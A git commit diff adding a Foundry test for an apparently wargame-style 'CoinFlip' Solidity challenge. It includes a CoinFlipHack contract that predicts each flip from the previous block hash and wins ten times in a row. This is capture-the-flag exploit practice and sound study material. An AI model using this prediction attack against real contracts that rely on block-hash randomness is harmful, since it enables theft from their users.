68003206d2f849df783868e62a21f19015952592
enzo jakobasch <enzo.jakobasch@gmail.com>
2023-03-29 19:49:15 +0200

    CoinFlip test done

--- test/03 coin flip/CoinFlip.t.sol
+++ test/03 coin flip/CoinFlip.t.sol
@@ -4,10 +4,11 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import {CoinFlip} from "../03 coin flip/CoinFlip.sol";
 
-contract CoinFlip is Test {
+contract CoinFlipTest is Test {
     address constant CONTRACT = address(42_000);
     address constant ATTACKER = address(42_001);
     CoinFlip coinflipContract;
+    CoinFlipHack hackContract;
 
     function setUp() public {
         // Set general test settings
@@ -18,8 +19,48 @@ contract CoinFlip is Test {
 
         vm.prank(CONTRACT);
         coinflipContract = new CoinFlip();
+        vm.prank(ATTACKER);
+        hackContract = new CoinFlipHack(address(coinflipContract));
 
         vm.roll(block.number + 1);
         vm.warp(block.timestamp + 100);
+    }
+
+    function test_coinflip() public {
+        console.log(" ");
+        console.log("====== INIT ======");
+        uint256 winStreak = coinflipContract.consecutiveWins();
+        assertEq(winStreak, 0);
+        console.log("Win streak : ");
+        console.log(winStreak);
+
+        console.log(" ");
+        console.log("====== STEP 1 ======");
+
+        for (uint256 i = 0; i < 10; ++i) {
+            vm.roll(block.number + 1);
+            vm.prank(ATTACKER);
+            hackContract.attack();
+        }
+        uint256 winStreakFinal = coinflipContract.consecutiveWins();
+        assertEq(winStreakFinal, 10);
+        console.log("Win streak : ");
+        console.log(winStreakFinal);
+    }
+}
+
+contract CoinFlipHack {
+    CoinFlip immutable victim;
+
+    constructor(address coinflipAddress) {
+        victim = CoinFlip(coinflipAddress);
+    }
+
+    function attack() external {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue /
+            57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        bool side = coinFlip == 1 ? true : false;
+        victim.flip(side);
     }
 }
